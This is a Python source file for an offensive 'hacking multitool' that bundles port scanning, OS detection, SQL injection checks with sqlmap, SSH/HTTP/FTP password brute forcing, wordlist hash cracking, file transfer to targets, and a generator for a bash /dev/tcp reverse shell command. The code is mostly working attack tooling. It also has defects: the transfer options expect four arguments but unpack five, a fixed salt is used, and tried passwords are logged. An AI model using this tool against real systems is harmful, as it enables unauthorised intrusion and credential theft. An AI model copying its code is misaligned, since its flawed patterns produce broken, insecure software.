import argparse
import socket
import hashlib
import requests
import threading
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
import paramiko
import ftplib
import subprocess
import scapy.all as scapy
import os
import json
import logging
from scp import SCPClient

# Configure logging for auto-reporting
logging.basicConfig(filename='report.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Gradient banner
def print_banner():
    banner = (
" ███▄ ▄███▓ █    ██  ██▓  ▄▄▄█████▓ ██▓▄▄▄█████▓ ▒█████   ▒█████   ██▓    \n"
"▓██▒▀█▀ ██▒ ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    \n"
"▓██    ▓██░▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██▒▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    \n"
"▒██    ▒██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██░░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    \n"
"▒██▒   ░██▒▒▒█████▓ ░██████▒▒██▒ ░ ░██░  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒\n"
"░ ▒░   ░  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░▓    ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░\n"
"░  ░      ░░░▒░ ░ ░ ░ ░ ▒  ░  ░     ▒ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░\n"
"░      ░    ░░░ ░ ░   ░ ░   ░       ▒ ░  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   \n"
"      ░      ░         ░  ░        ░               ░ ░      ░ ░      ░  ░ \n"
"                   Created By SaadSaid158 on GitHub                       \n"
"          With great power comes great responsibility — Stan Lee          \n"
 
    )
    print(banner)

# Global variables
open_ports = []

# Port Scanner with Banner Grabbing
def port_scan(ip, port_range):
    logging.info(f"Scanning {ip} for open ports in range {port_range}...")
    start_port, end_port = map(int, port_range.split('-'))
    threads = []

    def scan_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    logging.info(f"Port {port} is open")
                    open_ports.append(port)
                    grab_banner(ip, port)
        except Exception as e:
            logging.error(f"Error scanning port {port}: {e}")

    for port in range(start_port, end_port + 1):
        thread = threading.Thread(target=scan_port, args=(port,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def grab_banner(ip, port):
    try:
        with socket.socket() as sock:
            sock.connect((ip, port))
            sock.settimeout(1)
            banner = sock.recv(1024).decode().strip()
            logging.info(f"Banner from port {port}: {banner}")
    except Exception as e:
        logging.error(f"Error grabbing banner from port {port}: {e}")

# OS Detection
def detect_os(ip):
    logging.info(f"Detecting OS for {ip}...")
    try:
        response = subprocess.check_output(f"nmap -O {ip}", shell=True, stderr=subprocess.STDOUT).decode()
        logging.info(response)
    except subprocess.CalledProcessError as e:
        logging.error(f"Error detecting OS: {e.output.decode()}")

# GeoIP Lookup
def geoip_lookup(ip):
    logging.info(f"Looking up GeoIP for {ip}...")
    response = requests.get(f"http://ip-api.com/json/{ip}")
    if response.status_code == 200:
        data = response.json()
        logging.info(f"GeoIP Data: {data}")
    else:
        logging.error("Failed to retrieve GeoIP data.")

# SQL Injection Check using SQLmap
def sql_injection_check(url):
    logging.info(f"Checking {url} for SQL injection...")
    subprocess.run(f"sqlmap -u {url} --batch", shell=True)

# Password Strength Checker
def password_strength(password):
    logging.info(f"Checking strength for password: {password}")
    if len(password) < 8:
        return "Weak"
    if any(char.isdigit() for char in password) and any(char.isalpha() for char in password):
        return "Strong"
    return "Moderate"

# DNS Enumeration
def dns_enumeration(domain):
    logging.info(f"Enumerating DNS records for {domain}...")
    subprocess.run(f"dig {domain} ANY", shell=True)

# Enum4Linux
def enum4linux(ip):
    logging.info(f"Running Enum4Linux on {ip}...")
    subprocess.run(f"enum4linux {ip}", shell=True)

# Reverse Shell Generation
def reverse_shell(ip, port):
    logging.info(f"Generating reverse shell command to {ip}:{port}...")
    reverse_shell_command = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    logging.info(f"Reverse shell command: {reverse_shell_command}")

# Stealth Mode Implementation
def stealth_mode():
    logging.info("Activating stealth mode...")
    os.environ['LOGGING_LEVEL'] = 'ERROR'
    logging.info("Logging level set to ERROR.")

# Advanced Brute Forcing
def brute_force(target, username, password_file, protocol):
    logging.info(f"Starting brute force on {target} as {username}...")
    with open(password_file, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            if try_login(target, username, password, protocol):
                logging.info(f"Success! Username: {username}, Password: {password}")
                return
    logging.warning("Brute force failed.")

def try_login(target, username, password, protocol):
    if protocol == 'ssh':
        return ssh_login(target, username, password)
    elif protocol == 'http':
        return http_login(target, username, password)
    elif protocol == 'ftp':
        return ftp_login(target, username, password)
    return False

def ssh_login(target, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target, username=username, password=password, timeout=2)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        logging.error(f"SSH login error: {e}")
        return False

def http_login(target, username, password):
    url = f"http://{target}/login"
    data = {'username': username, 'password': password}
    try:
        response = requests.post(url, data=data)
        return "Login successful" in response.text
    except requests.RequestException as e:
        logging.error(f"HTTP login error: {e}")
        return False

def ftp_login(target, username, password):
    try:
        ftp = ftplib.FTP(target)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        logging.error(f"FTP login error: {e}")
        return False

# File Encryption/Decryption
def encrypt_file(filename, password):
    logging.info(f"Encrypting {filename}...")
    key = PBKDF2(password.encode(), b'salt', dkLen=32)
    cipher = AES.new(key, AES.MODE_GCM)
    with open(filename, 'rb') as f:
        data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(filename + ".enc", 'wb') as f_enc:
        f_enc.write(cipher.nonce + tag + ciphertext)
    logging.info(f"{filename} encrypted successfully!")

def decrypt_file(filename, password):
    logging.info(f"Decrypting {filename}...")
    key = PBKDF2(password.encode(), b'salt', dkLen=32)
    with open(filename, 'rb') as f_enc:
        nonce, tag, ciphertext = [f_enc.read(x) for x in (16, 16, -1)]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)
    with open(filename[:-4], 'wb') as f:
        f.write(data)
    logging.info(f"{filename} decrypted successfully!")

def hash_crack(hash_value, hash_type):
    logging.info(f"Cracking {hash_type} hash: {hash_value}...")
    wordlist = '/usr/share/wordlists/rockyou.txt'  
    with open(wordlist, 'r') as f:
        for line in f:
            candidate = line.strip()
            if hash_type == 'md5' and hashlib.md5(candidate.encode()).hexdigest() == hash_value:
                logging.info(f"MD5 hash cracked: {candidate}")
                return candidate
            elif hash_type == 'sha1' and hashlib.sha1(candidate.encode()).hexdigest() == hash_value:
                logging.info(f"SHA1 hash cracked: {candidate}")
                return candidate
    logging.warning("Hash not cracked.")
    return None

def searchsploit_lookup(term):
    logging.info(f"Searching for {term} in SearchSploit...")
    result = subprocess.run(f"searchsploit {term}", shell=True, capture_output=True, text=True)
    logging.info(result.stdout)

def ftp_transfer(target, username, password, local_file, remote_file):
    try:
        ftp = ftplib.FTP(target)
        ftp.login(user=username, passwd=password)
        with open(local_file, 'rb') as f:
            ftp.storbinary(f'STOR {remote_file}', f)
        ftp.quit()
        logging.info(f"Successfully transferred {local_file} to {target}:{remote_file}")
    except Exception as e:
        logging.error(f"FTP transfer error: {e}")

def scp_transfer(target, username, password, local_file, remote_file):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=username, password=password)
        scp = SCPClient(ssh.get_transport())
        scp.put(local_file, remote_path=remote_file)
        scp.close()
        logging.info(f"Successfully transferred {local_file} to {target}:{remote_file}")
    except Exception as e:
        logging.error(f"SCP transfer error: {e}")

def api_interaction(api_url, params):
    logging.info(f"Interacting with API at {api_url}...")
    try:
        response = requests.get(api_url, params=params)
        if response.status_code == 200:
            logging.info(f"API Response: {response.json()}")
        else:
            logging.error(f"API error: {response.status_code}")
    except requests.RequestException as e:
        logging.error(f"API interaction error: {e}")

# Automated Reporting
def generate_report():
    logging.info("Generating automated report...")
    with open('report.log', 'r') as f:
        content = f.read()
    with open('report.txt', 'w') as report_file:
        report_file.write(content)
    logging.info("Report generated: report.txt")

# Main Function
if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description="Ultimate Hacking Multitool")
    parser.add_argument("--scan", help="Scan a range of ports, e.g., 192.168.1.1 20-80")
    parser.add_argument("--os-detect", help="Detect OS for the target IP")
    parser.add_argument("--geoip", help="Lookup GeoIP for the target IP")
    parser.add_argument("--sql-injection", help="Check URL for SQL injection")
    parser.add_argument("--password-strength", help="Check password strength")
    parser.add_argument("--dns-enumeration", help="Enumerate DNS records for the domain")
    parser.add_argument("--enum4linux", help="Run Enum4Linux on target IP")
    parser.add_argument("--reverse-shell", help="Generate reverse shell command")
    parser.add_argument("--stealth", action="store_true", help="Activate stealth mode")
    parser.add_argument("--brute-force", nargs=4, help="Brute force: target username password_file protocol")
    parser.add_argument("--encrypt", help="Encrypt a file")
    parser.add_argument("--decrypt", help="Decrypt a file")
    parser.add_argument("--hash-crack", nargs=2, help="Crack a hash: hash_value hash_type")
    parser.add_argument("--searchsploit", help="Search for a term in SearchSploit")
    parser.add_argument("--ftp-transfer", nargs=4, help="FTP transfer: target username password local_file remote_file")
    parser.add_argument("--scp-transfer", nargs=4, help="SCP transfer: target username password local_file remote_file")
    parser.add_argument("--api", nargs=2, help="Interact with API: api_url params")
    parser.add_argument("--report", action="store_true", help="Generate automated report")

    args = parser.parse_args()

    if args.scan:
        ip, port_range = args.scan.split()
        port_scan(ip, port_range)
    if args.os_detect:
        detect_os(args.os_detect)
    if args.geoip:
        geoip_lookup(args.geoip)
    if args.sql_injection:
        sql_injection_check(args.sql_injection)
    if args.password_strength:
        strength = password_strength(args.password_strength)
        logging.info(f"Password strength: {strength}")
    if args.dns_enumeration:
        dns_enumeration(args.dns_enumeration)
    if args.enum4linux:
        enum4linux(args.enum4linux)
    if args.reverse_shell:
        reverse_shell(args.reverse_shell, 4444)
    if args.stealth:
        stealth_mode()
    if args.brute_force:
        target, username, password_file, protocol = args.brute_force
        brute_force(target, username, password_file, protocol)
    if args.encrypt:
        encrypt_file(args.encrypt, "your_password")
    if args.decrypt:
        decrypt_file(args.decrypt, "your_password")
    if args.hash_crack:
        hash_value, hash_type = args.hash_crack
        hash_crack(hash_value, hash_type)
    if args.searchsploit:
        searchsploit_lookup(args.searchsploit)
    if args.ftp_transfer:
        target, username, password, local_file, remote_file = args.ftp_transfer
        ftp_transfer(target, username, password, local_file, remote_file)
    if args.scp_transfer:
        target, username, password, local_file, remote_file = args.scp_transfer
        scp_transfer(target, username, password, local_file, remote_file)
    if args.api:
        api_url, params = args.api
        api_interaction(api_url, json.loads(params))  
    if args.report:
        generate_report()
